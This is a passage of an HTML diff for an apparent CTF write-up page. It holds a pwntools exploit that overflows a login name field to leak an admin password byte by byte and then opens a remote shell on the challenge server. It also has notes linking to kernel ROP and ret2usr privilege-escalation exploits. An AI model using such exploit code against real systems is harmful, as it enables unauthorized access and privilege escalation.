+<span class="c1">#sh = remote(&quot;172.16.202.302&quot;, 8888)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;geekgame.scuctf.com&quot;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+<span class="c1"># context.log_level = &quot;debug&quot;</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">passwd_len</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input Your Name:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">):</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input Admin Passwd:&quot;</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Please Input The Length Of New Passwd:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">passwd_len</span><span class="p">))</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input The New Passwd:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">switch_account</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[2]:Start A New Article</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Are You Sure To Switch Account? yes/no?:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input The New Name:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input The Passwd:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">new_article</span><span class="p">(</span><span class="n">context</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[2]:Start A New Article</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;[+] Input The Content Of Article(end with &#39;#&#39;):</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
+
+
+<span class="n">passwd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x600000004000</span>
+
+<span class="n">ppp</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span><span class="p">(</span><span class="n">num</span> <span class="o">&lt;</span> <span class="mi">19</span><span class="p">):</span>
+    <span class="n">login</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;povcfe&quot;</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;aaa&quot;</span><span class="p">)</span>
+    <span class="n">new_article</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;aaaa#&quot;</span><span class="p">)</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mi">1</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;admin&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">ppp</span> <span class="o">=</span> <span class="n">ppp</span><span class="o">+</span><span class="mi">1</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">):</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">try_passwd</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+                <span class="n">switch_account</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">try_passwd</span><span class="p">)</span>
+
+            <span class="k">except</span><span class="p">:</span>
+                <span class="n">num</span> <span class="o">=</span> <span class="n">num</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="n">passwd</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;one byte is: &quot;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+                <span class="k">break</span>
+
+        <span class="c1"># sh = process(&quot;./passwd&quot;)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="c1"># sh = remote(&quot;172.16.202.132&quot;, 8888)</span>
+        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;geekgame.scuctf.com&quot;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+        <span class="k">break</span>
+
+<span class="n">login</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;povcfe&quot;</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;aaa&quot;</span><span class="p">)</span>
+<span class="n">new_article</span><span class="p">(</span><span class="s2">&quot;bbb#&quot;</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ppp</span><span class="p">))</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x600000000000</span>
+<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;admin&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">):</span>
+
+        <span class="n">try_passwd</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;try passwd is: &quot;</span> <span class="o">+</span> <span class="n">try_passwd</span><span class="p">)</span>
+        <span class="n">switch_account</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">try_passwd</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;echo bll&quot;</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;bll&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;over&quot;</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;passwd is: &quot;</span> <span class="o">+</span> <span class="n">try_passwd</span><span class="p">)</span>
+<span class="k">break</span>
+</pre></div>
+
+<h2 id="kernel_rop">Kernel_rop（简单的内核栈溢出）<a class="headerlink" href="#kernel_rop" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>一．Hint中给出学习内核基础知识的链接，同时hint3直接给出解题的详细步骤，只隐藏ROP构造部分，现已补全<a href="https://www.povcfe.site/2020/05/16/kernel-rop/#more">经典ROP</a></p>
+</li>
+<li>
+<p>二．内核栈溢出除了hint给出的经典ROP利用，还可以使用ret2usr的利用方法(这个方法在hint3所给链接的隔壁，我专门把那篇文章放在了博客首行，并且给出了exp，编译之后直接运行就可以提权orz，竟然没人发现) <a href="https://www.povcfe.site/2020/05/17/kernel-ret2usr/#more">ret2usr</a></p>
+</li>
+</ul>
+                
+                  
+                
+              
+              
+                
+
+
+  <h2 id="__comments">评论</h2>
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = "None";
+      this.page.identifier =
+        "None";
+    };
+    (function() {
+      var d = document, s = d.createElement("script");
+      s.src = "//scu-ctf.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../Web/" title="Web" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                Web
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../../比赛信息/" title="比赛信息发布" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                比赛信息发布
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.2ba8dec4.js"></script>
+      
+        
+        
+          
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
